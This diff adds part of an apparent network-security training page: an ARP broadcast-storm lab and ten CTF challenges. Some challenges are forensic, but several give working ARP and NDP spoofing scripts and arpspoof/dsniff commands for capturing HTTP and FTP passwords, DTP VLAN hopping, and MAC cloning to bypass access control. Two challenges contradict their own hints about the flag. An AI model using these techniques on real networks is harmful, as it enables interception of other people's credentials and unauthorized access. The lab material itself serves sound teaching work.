+          <h4>Lab 12: Broadcast Storm Analysis</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Generate and analyze ARP broadcast storms. Understand their impact on network performance and configure storm control.</p>
+          <div class="setup-code">
+<pre><code class="language-python">from scapy.all import *
+import time
+
+# Generate ARP broadcast storm (controlled lab ONLY)
+print("[*] Sending ARP broadcast storm for 10 seconds...")
+start = time.time()
+count = 0
+while time.time() - start < 10:
+    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
+        op=1, pdst=f"192.168.1.{count % 254 + 1}")
+    sendp(pkt, iface="eth0", verbose=0)
+    count += 1
+
+print(f"[+] Sent {count} broadcast ARP packets in 10 seconds")</code></pre>
+<pre><code class="language-bash"># Monitor broadcast traffic
+tcpdump -i eth0 broadcast -c 1000 2>/dev/null | wc -l
+
+# Cisco storm control
+conf t
+interface GigabitEthernet0/1
+  storm-control broadcast level 10    ! block if broadcasts exceed 10% of bandwidth
+  storm-control action shutdown
+exit
+
+show storm-control broadcast</code></pre>
+          </div>
+        </div>
+      </div>
+
+      <!-- ==================== CTF TAB ==================== -->
+      <div class="tab-content" id="ctf">
+        <h2>CTF Challenges</h2>
+
+        <div class="ctf-card">
+          <h4>Challenge 1: Detect the Spoofer</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">You've been given a pcap file from a network where an ARP spoofing attack occurred. Identify the attacker's MAC address and the IP they were impersonating.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Open the pcap in Wireshark
+wireshark suspicious_traffic.pcap
+
+# Filter for ARP traffic
+# Display filter: arp
+
+# Look for:
+# 1. Duplicate IP-to-MAC mappings (two MACs claiming the same IP)
+# 2. Gratuitous ARP replies (unsolicited)
+# 3. ARP storm (high volume of ARP replies from one MAC)
+
+# Wireshark filter for duplicate address detection:
+# arp.duplicate-address-detected
+
+# tshark one-liner to extract ARP reply sources:
+tshark -r suspicious_traffic.pcap -Y "arp.opcode == 2" \
+  -T fields -e arp.src.hw_mac -e arp.src.proto_ipv4 | sort | uniq -c | sort -rn
+
+# Flag format: FLAG{attacker_mac_impersonated_ip}
+# Example: FLAG{aa:bb:cc:dd:ee:ff_192.168.1.1}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Filter for <code>arp.opcode == 2</code> (replies only). The attacker's MAC will appear claiming multiple IPs or the same IP as the legitimate gateway. Compare early ARP replies (before the attack) with later ones — the MAC address that changes for the gateway IP is the attacker. Wireshark's expert info may flag "duplicate IP address" automatically.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 2: MITM Credential Interception</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">You're on the same network as a target user who periodically logs into an HTTP service. Perform an ARP spoofing MITM attack and capture their credentials. The flag is the intercepted password.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Network: 192.168.1.0/24
+# Gateway: 192.168.1.1
+# Target:  192.168.1.50 (logs into HTTP service on 192.168.1.200)
+# You:     192.168.1.99
+
+# Step 1: Enable forwarding
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+
+# Step 2: ARP spoof (pick your tool)
+sudo arpspoof -i eth0 -t 192.168.1.50 192.168.1.1 &amp;
+sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.50 &amp;
+
+# Step 3: Capture and filter for credentials
+sudo tcpdump -i eth0 -A -s 0 'host 192.168.1.50 and port 80' | grep -i -E 'user|pass|login'
+
+# OR use dsniff for automatic credential extraction
+sudo dsniff -i eth0
+
+# OR capture pcap and analyze in Wireshark
+sudo tcpdump -i eth0 -w creds.pcap host 192.168.1.50
+# Then: Wireshark → filter: http.request.method == POST → Follow HTTP Stream
+
+# Flag format: FLAG{captured_password}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Make sure IP forwarding is enabled or the victim loses connectivity (which tips them off). Use <code>dsniff</code> for easy credential sniffing or capture a pcap and search for POST requests containing form data. In Wireshark, use the filter <code>http.request.method == "POST"</code> and follow the HTTP stream to see the submitted username and password in cleartext.</p>
+          </div>
+        </div>
+
+        <!-- Challenge 3 -->
+        <div class="ctf-card">
+          <h4>Challenge 3: ARP Anomaly Hunter</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A pcap contains normal network traffic mixed with an ARP-based reconnaissance scan. Identify how many unique hosts the attacker discovered and the attacker's MAC address.</p>
+          <div class="setup-code">
+<pre><code class="language-python">from scapy.all import *
+from collections import Counter
+
+pkts = rdpcap("recon.pcap")
+
+# Find the MAC sending the most ARP requests
+arp_requests = [p for p in pkts if p.haslayer(ARP) and p[ARP].op == 1]
+mac_counts = Counter(p[ARP].hwsrc for p in arp_requests)
+attacker_mac = mac_counts.most_common(1)[0][0]
+
+# Count unique hosts discovered (replies to attacker)
+arp_replies = [p for p in pkts if p.haslayer(ARP) and p[ARP].op == 2
+               and p[ARP].hwdst == attacker_mac]
+discovered = set(p[ARP].psrc for p in arp_replies)
+
+print(f"Attacker MAC: {attacker_mac}")
+print(f"Hosts discovered: {len(discovered)}")
+# Flag: FLAG{attacker_mac_count}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The attacker sends ARP requests to sequential IPs (subnet scan). Count the unique source MAC sending the most ARP requests — that's the scanner. Then count unique ARP replies directed back to that MAC.</p>
+          </div>
+        </div>
+
+        <!-- Challenge 4 -->
+        <div class="ctf-card">
+          <h4>Challenge 4: Layer 2 Segmentation Bypass</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Two VLANs are configured: VLAN 10 (your access) and VLAN 20 (flag server). The switch port is misconfigured with DTP enabled. Negotiate a trunk and reach the flag server at 192.168.20.10:8080.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Step 1: Negotiate trunk with Yersinia
+sudo yersinia dtp -attack 1 -interface eth0
+
+# Step 2: Create VLAN 20 sub-interface
+sudo modprobe 8021q
+sudo ip link add link eth0 name eth0.20 type vlan id 20
+sudo ip addr add 192.168.20.99/24 dev eth0.20
+sudo ip link set eth0.20 up
+
+# Step 3: Reach the flag server
+curl http://192.168.20.10:8080/flag</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Use <code>yersinia dtp -attack 1</code> to negotiate a trunk. Verify with <code>tcpdump -e</code> — you should see 802.1Q tagged frames. Create a VLAN sub-interface for VLAN 20 and assign an IP in the 192.168.20.0/24 range.</p>
+          </div>
+        </div>
+
+        <!-- Challenge 5 -->
+        <div class="ctf-card">
+          <h4>Challenge 5: MAC Cloning Challenge</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A network uses MAC-based access control. Only one registered MAC (<code>de:ad:be:ef:ca:fe</code>) can reach the admin panel on 192.168.1.1:443. Clone the MAC and retrieve the flag.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Step 1: Verify current access is blocked
+curl -k https://192.168.1.1/admin   # 403 Forbidden
+
+# Step 2: Clone the allowed MAC
+sudo ip link set eth0 down
+sudo ip link set eth0 address de:ad:be:ef:ca:fe
+sudo ip link set eth0 up
+
+# Step 3: Get a new DHCP lease with the new MAC
+sudo dhclient -r eth0 && sudo dhclient eth0
+
+# Step 4: Access the admin panel
+curl -k https://192.168.1.1/admin</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Make sure the legitimate device with that MAC is offline first, or you'll cause a conflict. After changing your MAC, renew your DHCP lease — the DHCP server may assign a different IP based on MAC reservation.</p>
+          </div>
+        </div>
+
+        <!-- Challenge 6 -->
+        <div class="ctf-card">
+          <h4>Challenge 6: Passive Network Discovery</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Without sending any packets, passively monitor ARP traffic for 5 minutes to build a complete map of the network. Identify all hosts, the gateway, and any DHCP servers. The flag is the gateway's MAC.</p>
+          <div class="setup-code">
+<pre><code class="language-python">from scapy.all import *
+from collections import defaultdict
+
+hosts = {}
+gateway_candidates = defaultdict(int)
+
+def passive_monitor(pkt):
+    if pkt.haslayer(ARP):
+        ip = pkt[ARP].psrc
+        mac = pkt[ARP].hwsrc
+        hosts[ip] = mac
+
+        # Gateway is the most frequently queried target
+        if pkt[ARP].op == 1:  # request
+            gateway_candidates[pkt[ARP].pdst] += 1
+
+pkts = sniff(filter="arp", timeout=300, prn=passive_monitor)
+
+print("=== Network Map ===")
+for ip, mac in sorted(hosts.items()):
+    print(f"  {ip:15s} → {mac}")
+
+gw = max(gateway_candidates, key=gateway_candidates.get)
+print(f"\n[+] Likely gateway: {gw} (MAC: {hosts.get(gw, 'unknown')})")
+# Flag: FLAG{gateway_mac}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Don't send any packets — just listen. The gateway IP is the one most frequently seen as the target of ARP requests (since all hosts need to resolve it). Its MAC appears in ARP replies.</p>
+          </div>
+        </div>
+
+        <!-- Challenge 7 -->
+        <div class="ctf-card">
+          <h4>Challenge 7: ARP Race Condition</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">A security appliance monitors ARP and blocks spoofing attempts, but it has a race condition: if you send a valid ARP request followed by a spoofed reply within 5ms, the reply is accepted. Exploit this to MITM the connection and intercept the flag.</p>
+          <div class="setup-code">
+<pre><code class="language-python">from scapy.all import *
+import time
+
+victim = "192.168.1.100"
+gateway = "192.168.1.1"
+my_mac = get_if_hwaddr("eth0")
+
+# Send legitimate ARP request immediately followed by spoofed reply
+# The IDS checks the request, creating a brief window
+
+while True:
+    # Legitimate request (makes IDS think normal traffic)
+    req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=gateway)
+    # Spoofed reply (must arrive within 5ms of request)
+    spoof = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
+        op=2, psrc=gateway, hwsrc=my_mac,
+        pdst=victim, hwdst="ff:ff:ff:ff:ff:ff")
+
+    sendp([req, spoof], iface="eth0", verbose=0, inter=0.001)
+    time.sleep(2)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The key is timing. Send the request and reply as a batch with near-zero interval (<code>inter=0.001</code>). The IDS processes the request and whitelists the reply source for a brief window. Don't forget to enable IP forwarding before intercepting.</p>
+          </div>
+        </div>
+
+        <!-- Challenge 8 -->
+        <div class="ctf-card">
+          <h4>Challenge 8: Dual-Stack ARP/NDP Attack</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">A network runs dual-stack (IPv4 + IPv6). ARP spoofing is blocked by DAI, but NDP (Neighbor Discovery Protocol) for IPv6 has no equivalent protection. Use NDP spoofing to MITM the IPv6 traffic and capture the flag from an HTTPS connection.</p>
+          <div class="setup-code">
+<pre><code class="language-python">from scapy.all import *
+
+victim_ipv6 = "fe80::1"
+gateway_ipv6 = "fe80::ffff"
+my_mac = get_if_hwaddr("eth0")
+
+# IPv6 Neighbor Advertisement (equivalent of ARP reply)
+# Tell victim: gateway's link-local is at our MAC
+na = Ether(dst="33:33:00:00:00:01") / \
+     IPv6(src=gateway_ipv6, dst="ff02::1") / \
+     ICMPv6ND_NA(tgt=gateway_ipv6, R=1, S=0, O=1) / \
+     ICMPv6NDOptDstLLAddr(lladdr=my_mac)
+
+print("[*] Sending NDP spoofing packets...")
+sendp(na, iface="eth0", loop=1, inter=2)</code></pre>
+<pre><code class="language-bash"># Enable IPv6 forwarding
+sudo sysctl -w net.ipv6.conf.all.forwarding=1
+
+# Capture IPv6 traffic
+sudo tcpdump -i eth0 ip6 -w ndp_mitm.pcap</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>DAI only protects IPv4 ARP. IPv6 uses NDP which most networks don't protect with RA Guard or similar. Spoof Neighbor Advertisements targeting the gateway's link-local address. Capture the IPv6 traffic — the flag is in an HTTP (not HTTPS) request over IPv6.</p>
+          </div>
+        </div>
+
+        <!-- Challenge 9 -->
+        <div class="ctf-card">
+          <h4>Challenge 9: Network Sniffing Setup</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Set up a network sniffer on a switched network. Since switches don't broadcast unicast traffic, use ARP spoofing to capture traffic between two hosts. Extract the flag from an FTP session.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Enable forwarding
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+
+# ARP spoof both directions
+sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.200 &amp;
+sudo arpspoof -i eth0 -t 192.168.1.200 192.168.1.100 &amp;
+
+# Capture FTP traffic
+sudo tcpdump -i eth0 -A 'port 21' -w ftp_capture.pcap
+
+# Extract credentials
+tshark -r ftp_capture.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS" \
+  -T fields -e ftp.request.arg</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>FTP credentials are transmitted in plaintext. Spoof both directions (victim↔server) so you see both sides. Filter for FTP USER and PASS commands. The password is the flag.</p>
+          </div>
+        </div>
+
+        <!-- Challenge 10 -->
+        <div class="ctf-card">
+          <h4>Challenge 10: ARP Table Forensics</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A forensic image contains the ARP table from a compromised host. Analyze it to identify: which host was the attacker, which host was being impersonated, and the attacker's real IP. The flag combines all three.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Extracted ARP table from forensic image:
+# IP               MAC                 Type
+# 192.168.1.1      aa:bb:cc:11:22:33   dynamic    &lt;-- gateway
+# 192.168.1.50     aa:bb:cc:11:22:33   dynamic    &lt;-- same MAC as gateway!
+# 192.168.1.100    de:ad:be:ef:00:01   dynamic
+# 192.168.1.150    de:ad:be:ef:00:02   dynamic
+
+# The duplicate MAC reveals the attack:
+# 192.168.1.50 has the SAME MAC as 192.168.1.1 (gateway)
+# This means 192.168.1.50 was ARP-spoofing the gateway
+# Attacker: 192.168.1.50
+# Impersonated: 192.168.1.1
+
+# Verify: check if the MAC actually belongs to 192.168.1.50
+# Look up vendor OUI: aa:bb:cc → some vendor
+# Flag: FLAG{192.168.1.50_192.168.1.1_aa:bb:cc:11:22:33}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Look for two different IPs sharing the same MAC address. The non-gateway IP with the gateway's MAC is the attacker. The gateway IP is being impersonated. Cross-reference with the DHCP logs to find the attacker's real MAC.</p>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+</body>
+</html>
